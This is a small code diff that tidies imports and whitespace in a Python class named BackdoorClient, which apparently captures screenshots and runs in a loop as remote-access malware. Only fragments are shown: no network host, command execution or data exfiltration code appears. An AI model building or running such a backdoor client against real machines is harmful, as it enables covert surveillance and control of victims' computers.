@@ -4,8 +4,6 @@ import subprocess
 import os
 import base64
 from PIL import ImageGrab
-import sys
-import time
 
 
 
@@ -66,7 +64,6 @@ class BackdoorClient:
         except Exception as e:
             return (f"[Screenshot failed: {str(e)}]")
             
-    
     def run(self):
         while True:
             try:
